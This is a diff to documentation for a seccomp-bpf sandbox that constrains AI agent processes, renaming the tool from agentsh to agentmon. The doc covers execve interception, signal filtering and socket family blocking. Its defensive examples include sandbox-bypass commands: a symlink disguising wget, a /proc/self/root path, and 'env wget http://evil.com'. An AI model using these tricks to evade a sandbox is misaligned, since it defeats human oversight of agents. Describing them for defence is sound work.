@@ -1,6 +1,6 @@
 # Seccomp-BPF Syscall Filtering
 
-agentsh uses seccomp-bpf to enforce syscall-level security controls on agent processes.
+agentmon uses seccomp-bpf to enforce syscall-level security controls on agent processes.
 
 ## Overview
 
@@ -54,12 +54,12 @@ sandbox:
       - family: AF_VSOCK
         action: log_and_kill
 
-    # Advisory mitigation sets. Built-ins are embedded in agentsh; external
+    # Advisory mitigation sets. Built-ins are embedded in agentmon; external
     # directories are optional and only requested IDs are loaded.
     # mitigation_sets:
     #   - dirtyfrag-conservative
     # mitigation_dirs:
-    #   - /etc/agentsh/mitigations
+    #   - /etc/agentmon/mitigations
 
     # Lower-level socket tuple rules are also available as an alternative.
     # socket_rules:
@@ -80,7 +80,7 @@ File monitoring uses `SECCOMP_RET_USER_NOTIF` to evaluate filesystem policy for 
 
 ## Signal Interception
 
-Signal filtering uses `SECCOMP_RET_USER_NOTIF` to intercept signal-related syscalls before they execute. This allows agentsh to evaluate policy rules and decide whether to allow, deny, redirect, or audit the signal.
+Signal filtering uses `SECCOMP_RET_USER_NOTIF` to intercept signal-related syscalls before they execute. This allows agentmon to evaluate policy rules and decide whether to allow, deny, redirect, or audit the signal.
 
 ### Intercepted Syscalls
 
@@ -95,8 +95,8 @@ Signal filtering uses `SECCOMP_RET_USER_NOTIF` to intercept signal-related sysca
 ### How It Works
 
 1. Process calls `kill(pid, SIGTERM)` or similar
-2. seccomp traps the syscall and notifies agentsh via the user-notify fd
-3. agentsh classifies the target (self, child, external, system, etc.)
+2. seccomp traps the syscall and notifies agentmon via the user-notify fd
+3. agentmon classifies the target (self, child, external, system, etc.)
 4. Policy rules are evaluated for the signal/target combination
 5. Decision is executed:
    - **allow**: Syscall continues normally
@@ -169,13 +169,13 @@ See [Policy Documentation](operations/policies.md#signal-rules) for full configu
 
 ## Execve Interception
 
-Execve interception uses `SECCOMP_RET_USER_NOTIF` to trap `execve` and `execveat` syscalls, allowing agentsh to evaluate command execution against policy before it happens.
+Execve interception uses `SECCOMP_RET_USER_NOTIF` to trap `execve` and `execveat` syscalls, allowing agentmon to evaluate command execution against policy before it happens.
 
 ### Security Hardening
 
 #### Path Canonicalization
 
-Before policy evaluation, agentsh resolves the executable path using `filepath.EvalSymlinks`. This defeats bypass attacks using:
+Before policy evaluation, agentmon resolves the executable path using `filepath.EvalSymlinks`. This defeats bypass attacks using:
 - Symlinks to blocked binaries (e.g., `ln -s /usr/bin/wget /tmp/safe && /tmp/safe`)
 - `/proc/self/root` paths (e.g., `/proc/self/root/usr/bin/wget`)
 - Relative path tricks
@@ -184,7 +184,7 @@ The original (pre-canonicalization) path is preserved in audit events as `raw_fi
 
 #### Transparent Command Unwrapping
 
-When a wrapper command (like `env`, `sudo`, or `ld-linux`) is detected, agentsh "unwraps" it to find the real payload command and evaluates both against policy. The most restrictive decision wins.
+When a wrapper command (like `env`, `sudo`, or `ld-linux`) is detected, agentmon "unwraps" it to find the real payload command and evaluates both against policy. The most restrictive decision wins.
 
 **Example:** `env wget http://evil.com`
 1. `env` is recognized as transparent → unwrap
@@ -249,7 +249,7 @@ When seccomp is enabled, these syscalls are blocked by default:
 
 **Why four modes:** `errno` is the lowest-cost default — well-behaved agents get a predictable `EPERM` and carry on; misbehaving ones are stopped at the kernel. `kill` is the irrevocable stance. `log` / `log_and_kill` take a user-notify round-trip per blocked call, so they are observable but more expensive; reach for them when you want an audit trail of every attempted violation.
 
-**Startup warning:** when `on_block` is `log` or `log_and_kill` but no audit sink is registered, agentsh logs a warning at startup so operators don't wonder where events went.
+**Startup warning:** when `on_block` is `log` or `log_and_kill` but no audit sink is registered, agentmon logs a warning at startup so operators don't wonder where events went.
 
 ## Socket Family Blocking
 
@@ -257,7 +257,7 @@ When seccomp is enabled, these syscalls are blocked by default:
 
 ### Default list (when field unset)
 
-When `blocked_socket_families` is omitted from config, agentsh applies a recommended-default list of 12 families at `action: errno`. Set the field to `[]` to opt out entirely; set it to a non-empty list to override the defaults.
+When `blocked_socket_families` is omitted from config, agentmon applies a recommended-default list of 12 families at `action: errno`. Set the field to `[]` to opt out entirely; set it to a non-empty list to override the defaults.
 
 | Family | Number | Why default |
 |---|---|---|
@@ -289,10 +289,10 @@ Each entry's `family` field accepts either a name (`AF_ALG`) or a numeric string
 
 Family blocking has two engines that share the same config and emit identical audit-event shapes:
 
-1. **seccomp-bpf (primary)** — adds an `AddRuleConditional` rule on `socket(2)` arg0 to the existing seccomp filter. Cheap, kernel-side. Used when seccomp is available AND the agentsh-unixwrap binary will run.
+1. **seccomp-bpf (primary)** — adds an `AddRuleConditional` rule on `socket(2)` arg0 to the existing seccomp filter. Cheap, kernel-side. Used when seccomp is available AND the agentmon-unixwrap binary will run.
 2. **ptrace (fallback + defensive)** — when `sandbox.ptrace.enabled: true`, the family checker is also wired into the ptrace tracer regardless of which engine the selector reports. Runtime dispatch is mutually exclusive between engines, so this is safe and ensures coverage in hybrid configurations where the seccomp wrapper is skipped.
 
-If neither engine is available on the host, agentsh logs a startup warning and continues — families are not blocked.
+If neither engine is available on the host, agentmon logs a startup warning and continues — families are not blocked.
 
 ### Audit event
 
@@ -369,7 +369,7 @@ Named `NETLINK_*` protocol values are valid only with `family: AF_NETLINK`. A pr
 
 ### Mitigation Sets
 
-`sandbox.seccomp.mitigation_sets` loads named mitigation YAML files and expands them into ordinary seccomp rules. agentsh ships built-in mitigations and can also load external mitigation files from opt-in `mitigation_dirs`.
+`sandbox.seccomp.mitigation_sets` loads named mitigation YAML files and expands them into ordinary seccomp rules. agentmon ships built-in mitigations and can also load external mitigation files from opt-in `mitigation_dirs`.
 
 External mitigation IDs are loaded from `<id>.yaml` or `<id>.yml` files in `mitigation_dirs`. Duplicate mitigation IDs across built-in and external sources are rejected.
 
@@ -379,7 +379,7 @@ sandbox:
     mitigation_sets:
       - dirtyfrag-conservative
     mitigation_dirs:
-      - /etc/agentsh/mitigations
+      - /etc/agentmon/mitigations
 ```
 
 The built-in `dirtyfrag-conservative` set is a conservative mitigation for the Openwall Dirty Frag advisory dated May 7, 2026. It expands to two `socket_rules`: one for `AF_RXRPC`, and one for `AF_NETLINK` with protocol `NETLINK_XFRM`. Both rules use `action: log_and_kill`, so matching processes are killed and audit events are emitted. It does not block all `AF_NETLINK`.
@@ -449,4 +449,4 @@ When a block-listed syscall traps under `log` or `log_and_kill`, a `seccomp_bloc
 - libseccomp installed (for syscall name resolution)
 - CAP_SYS_ADMIN or no_new_privs for filter installation
 
-**Tip:** Use `agentsh detect` to check if seccomp is available in your environment. See [Cross-Platform Notes](cross-platform.md#detecting-available-capabilities).
+**Tip:** Use `agentmon detect` to check if seccomp is available in your environment. See [Cross-Platform Notes](cross-platform.md#detecting-available-capabilities).
